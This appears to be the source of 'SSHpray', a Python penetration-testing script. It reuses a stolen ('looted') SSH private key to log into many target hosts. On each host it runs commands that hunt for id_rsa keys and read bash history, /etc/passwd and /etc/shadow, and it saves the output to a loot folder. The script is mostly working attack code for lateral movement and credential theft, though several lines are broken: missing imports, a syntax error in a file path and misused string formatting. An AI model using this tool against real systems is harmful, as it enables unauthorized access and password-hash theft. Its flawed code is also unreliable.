#!/usr/bin/env python
try:
    import argparse, os, re, signal, socket, sys, time, paramiko
except Exception as e:
    print('\n[!] Import(s) failed! ' + str(e))

class SSHpray():

    def __init__(self, args):

        #defaults
        #record start time
        self.startTime = time.time()
        #pass in args. this is messy
        self.args = args
        #verbosity explicitly off
        self.verbose = False
        #version
        self.version ='beta.08012017'
        #default 5 second timeout for ssh
        self.timeout = int(5)
        #eventually we'll support >1 key
        self.private_keys = []
        #init target file 
        self.targets_file = None
        #targets from file go into the list
        self.target_list = []
        #target set is used for valid IPs
        self.target_set = set()
        #init username as none, default will apply current user if no -u
        self.user_name = None
        #record stdout from successful ssh command, will output later
        self.ssh_result = []
        #dump reports here
        self.report_dir = './reports/'
        if not os.path.exists(self.report_dir):
            os.makedirs(self.report_dir)
        #loot dir
        self.loot_dir = './loot/'
        if not os.path.exists(self.loot_dir):
            os.makedirs(self.loot_dir)
        #command(s) to run
        self.remote_commands = ['sudo locate id_rsa','tail -n 50 ~/.bash_history', 'cat /etc/passwd;','sudo cat /etc/shadow;','uname -a;','w;','who -a;','last','exit']


    def check_args(self, parser):
        #print version and supplied args if verbose
        if self.args.verbose is True: print('[i] Version: {}\n[i] Options: {}'.format(self.version,parser.parse_args()))

        #require at least one argument to provide targets
        if not (self.args.targets or self.args.ipaddress):
            print('\n[!] No scope provided, add a file with IPs with -f or IP address(es) with -i\n')
            parser.print_help()
            sys.exit(1)

        #if a file is supplied open it with read_targets function
        if self.args.targets is not None:
            print('[i] Opening targets file: {}'.format(self.args.targets))
            self.targets_file = self.args.targets
            #call read_targets function
            self.read_targets()
        
        #if ip address isnt blank
        if self.args.ipaddress is not None: self.target_set.add(''.join(self.args.ipaddress))

        if self.args.username is None:
            self.user_name = os.getlogin()
        else:
            self.user_name = self.args.username

        if self.args.commands is not None:
            self.remote_commands=[]
            self.remote_commands.append(''.join(self.args.commands))

        if self.args.delay is not None:
            self.timeout = float(''.join(self.args.delay))

    def read_targets(self):
        #open targets file
        with open(self.args.targets) as f:
            targets = f.readlines()
            #add to target list, strip stuff
            for x in targets:
                self.target_list.append(x.strip())
        
        #iterate through target_list
        for i,t in enumerate(self.target_list):
            #test to see if its a valid ip using socket
            try:
                #print(socket.inet_aton(str(t)))
                #use socket to see if the current line is a valid IP 
                socket.inet_aton(t)
                #add to set
                self.target_set.add(t)
            #if the ip isnt valid, according to socket..
            except socket.error:
                #tell them
                print ('[!] Invalid IP address [ {} ] found on line {}... Fixing!'.format(t,i+1))
                #fix the entries. this function will add resolved IPs to the target_set
                self.fix_targets(t)
            except Exception as e:
                #print other errors
                print(e)
        
        #finally do a regex on targetList to clean it up(remove non-ip addresses)
        ipAddrRegex=re.compile('\d{1,3}.\d{1,3}.\d{1,3}.\d{1,3}')
        #only allow IP addresses--if it isnt'
        if not ipAddrRegex.match(t):
            #remove from targetList
            if self.args.verbose is True:print('[v] Removing invalid IP {}'% t)
            self.target_list.remove(t)
        else:
            #otherwise add to target set
            self.target_set.add(t)
        
        #need to expand cidr and filter rfc1918, etc    
        #show user target set of unique IPs
        if self.args.verbose is True:print('[i] Reconciled target list:')
        if self.args.verbose is True:print(', '.join(self.target_set))
        print('[i] All targets are valid IP addresses')
    
    def fix_targets(self, t):
        #function to resolve hostnames in target file or hostnames stripped from URLs to ip addresses.
        #handle full urls:
        if re.findall('http[s]?://(?:[a-zA-Z]|[0-9]|[$-_@.&+]|[!*\(\),]|(?:%[0-9a-fA-F][0-9a-fA-F]))+', t):
            parsed_uri = urlparse(t)
            domain = '{uri.netloc}'.format(uri=parsed_uri)
            if self.args.verbose is True:print('[i] Looking up IP for {}'.format(domain))
            hostDomainCmd = subprocess.Popen(['dig', '+short', domain], stdout = PIPE)
            #print('[i] IP address for {} found: {}'.format(t,hostDomainCmd.stdout.read().strip('\n')))
            #for each line in the host commands output, add to a fixed target list
            self.target_set.add(hostDomainCmd.stdout.read().strip('\n')) 
        
        #filter hostnames
        else:
            if self.args.verbose is True:print('[i] Looking up IP for hostname {}'.format(t))
            #just resolve ip from hostname if no http:// or https:// in the entry
            hostNameCmd = subprocess.Popen(['dig', '+short', t], stdout = PIPE)
            self.target_set.add(hostNameCmd.stdout.read().strip('\n'))
    
    def signal_handler(self, signal, frame):
        print('You pressed Ctrl+C! Exiting...')
        sys.exit(0)
    
    def cls(self):
        os.system('cls' if os.name == 'nt' else 'clear')
        print('SSHpray started at: {}'.format(time.strftime('%d/%m/%Y - %H:%M:%S')))
    
    def connect(self):

        pattern = re.compile('[\W_]+')
        pattern.sub('', string.printable)

        signal.signal(signal.SIGINT, self.signal_handler)
        with open(self.args.keyfile) as f:
            private_key = f.readlines()
        print('[i] Using Private Key: {} '.format(self.args.keyfile))
        for i, t in enumerate(self.target_set):
            if self.args.verbose is True: print ('[i] Attempting to SSH to {}'.format(t) )
            try:#Initialize SSH session to host via paramiko and run the command contents
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(t, username = self.args.username, key_filename = self.args.keyfile, timeout=self.timeout)
                print('[i] SUCCESS: {}'.format(t))
                for c in self.remote_commands:
                    #print('Running {}'.formatc)
                    stdin, stdout, stderr = ssh.exec_command(c)
                    #server response not working for some reason
                    print ('[+] {} responded to {} with: \n'.format(t,c))

                    #create dir if missing
                    if not os.path.exists(self.loot_dir+str(t)):
                        os.makedirs(self.loot_dir+str(t))

                    #save output to a file 
                    c = c.translate(None, '~!@#$%^&*()_+`-=[]\|/?.,<>')
                    with open(self.loot_dir+'/'str(c)+'_loot.txt', 'w') as loot_file:
                        loot_file.writelines(''.join(stdout.readlines()))

                    print (''.join(stdout.readlines()))


                    print('\n')
                ssh.close()
                print ('[+] SSH Session to {} closed'.format(t))
            except Exception as e:
                if self.args.verbose is True: print('[!] {:15} : {}'.format(t,e))
                pass

def main():
    #gather options
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--commands', metavar='<command>', help='command to run')
    parser.add_argument('-d', '--delay', metavar='<delay>', help='set timeout delay in seconds, default is 5 seconds')
    parser.add_argument('-i', '--ipaddress', metavar='<ip address>', help='single ip to test')
    parser.add_argument('-k', '--keyfile', metavar='<keyfile>', help='private key that you have looted')
    parser.add_argument('-t', '--targets', metavar='<targetfile>', help='list of ssh servers in a file, one per line')
    parser.add_argument('-u', '--username', metavar='<username>', help='username associated with key, default is current local user')
    parser.add_argument('-v', '--verbose', help='Optionally enable verbosity', action = 'store_true')
    args = parser.parse_args()
    run = SSHpray(args)
    run.cls()
    run.check_args(parser)
    run.connect()

if __name__ == '__main__':
    main()
